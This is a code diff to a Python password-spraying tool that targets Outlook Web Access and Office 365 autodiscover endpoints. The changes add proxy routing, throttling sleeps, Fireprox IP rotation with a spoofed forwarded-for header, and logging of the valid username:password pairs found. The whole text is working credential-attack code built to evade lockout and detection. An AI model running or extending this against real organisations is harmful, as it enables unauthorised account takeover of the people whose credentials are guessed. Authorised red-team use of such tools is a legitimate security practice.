@@ -1,5 +1,6 @@
 import logging
 import requests
+import time
 from requests_ntlm import HttpNtlmAuth
 from requests.exceptions import ConnectionError
 from core.utils.ntlmdecoder import ntlmdecode
@@ -7,7 +8,7 @@ from core.utils.messages import *
 
 
 class OWA:
-    def __init__(self, target):
+    def __init__(self, target, proxy=None, force_o365=False):
         self.url = target if target.startswith('https://') or target.startswith('http://') else None
         self.domain = target if not self.url else None
         self.log = logging.getLogger('owasprayer')
@@ -15,8 +16,10 @@ class OWA:
         self.autodiscover_url = None
         self.netbios_domain = None
         self.O365 = False
+        self.proxy = proxy
 
         self.recon()
+        self.O365 = force_o365 if force_o365 else self.O365
 
     def recon(self):
         if not self.url:
@@ -26,12 +29,13 @@ class OWA:
 
             # https://github.com/sensepost/ruler/blob/master/ruler.go#L125
             o365_owa_url = f"https://login.microsoftonline.com/{self.domain}/.well-known/openid-configuration"
-            r = requests.get(o365_owa_url, verify=False)
+            r = requests.get(o365_owa_url, verify=False, proxies=self.proxy)
             if r.status_code == 400:
                 self.log.info(print_good("OWA domain appears to be hosted internally"))
             elif r.status_code == 200:
                 self.log.info(print_info("OWA domain appears to be hosted on Office365"))
                 self.log.info(print_info("Using Office 365 autodiscover URL: https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"))
+                self.autodiscover_url = 'https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml'
                 self.O365 = True
         else:
             self.autodiscover_url = self.url
@@ -62,7 +66,7 @@ class OWA:
     def get_owa_domain(self, url):
         # Stolen from https://github.com/dafthack/MailSniper
         auth_header = {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
-        r = requests.post(url, headers=auth_header, verify=False)
+        r = requests.post(url, headers=auth_header, verify=False, proxies=self.proxy)
         if r.status_code == 401:
             ntlm_info = ntlmdecode(r.headers["WWW-Authenticate"])
 
@@ -78,36 +82,54 @@ class OWA:
         headers = {"Content-Type": "text/xml"}
         for url in urls:
             try:
-                r = requests.get(url, headers=headers, verify=False)
+                r = requests.get(url, headers=headers, verify=False, proxies=self.proxy)
                 if r.status_code == 401 or r.status_code == 403:
                     return url
             except ConnectionError:
                 continue
 
-    def auth_O365(self, username, password):
+    def auth_O365(self, username, password, proxy, sleep):
         log = logging.getLogger(f"auth_owa_O365({username})")
 
         headers = {"Content-Type": "text/xml"}
-        r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(username, password), verify=False)
-        if r.status_code == 200:
-            log.info(print_good(f"Found credentials: {username}:{password}"))
-            self.valid_accounts.add(f'{username}:{password}')
-        elif r.status_code == 456:
-            log.info(print_good(f"Found credentials: {username}:{password} - however cannot log in: please check manually (2FA, account locked...)"))
-            self.valid_accounts.add(f'{username}:{password} - check manually')
+        # extend headers when using Fireprox
+        if 'amazonaws.com/fireprox' in self.autodiscover_url:
+            headers['X-My-X-Forwarded-For'] = '127.0.0.1'
+        try:
+            r = requests.get(self.autodiscover_url, auth=(username, password), verify=False, proxies=proxy)
+        except BaseException as e:
+            log.error(print_bad(f"Error during authentication: {e}"))
         else:
-            log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
+            if r.status_code == 200:
+                log.info(print_good(f"Found credentials: {username}:{password}"))
+                self.valid_accounts.add(f'{username}:{password}')
+            elif r.status_code == 456:
+                log.info(print_good(f"Found credentials: {username}:{password} - however cannot log in: please check manually (2FA, account locked...)"))
+                self.valid_accounts.add(f'{username}:{password} - check manually')
+            else:
+                log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
+            # sleep before next attempt
+            time.sleep(sleep)
 
-    def auth(self, username, password):
+    def auth(self, username, password, proxy, sleep):
         log = logging.getLogger(f"auth_owa({username})")
 
         headers = {"Content-Type": "text/xml"}
-        r = requests.get(self.autodiscover_url, auth=HttpNtlmAuth(username, password), verify=False)
-        if r.status_code == 200:
-            log.info(print_good(f"Found credentials: {username}:{password}"))
-            self.valid_accounts.add(f'{username}:{password}')
+        # extend headers when using Fireprox
+        if 'amazonaws.com/fireprox' in self.autodiscover_url:
+            headers['X-My-X-Forwarded-For'] = '127.0.0.1'
+        try:
+            r = requests.get(self.autodiscover_url, auth=HttpNtlmAuth(username, password), verify=False, proxies=proxy)
+        except BaseException as e:
+            log.error(print_bad(f"Error during authentication: {e}"))
         else:
-            log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
+            if r.status_code == 200:
+                log.info(print_good(f"Found credentials: {username}:{password}"))
+                self.valid_accounts.add(f'{username}:{password}')
+            else:
+                log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
+            # sleep before next attempt
+            time.sleep(sleep)
 
     def __str__(self):
         return "OWA"
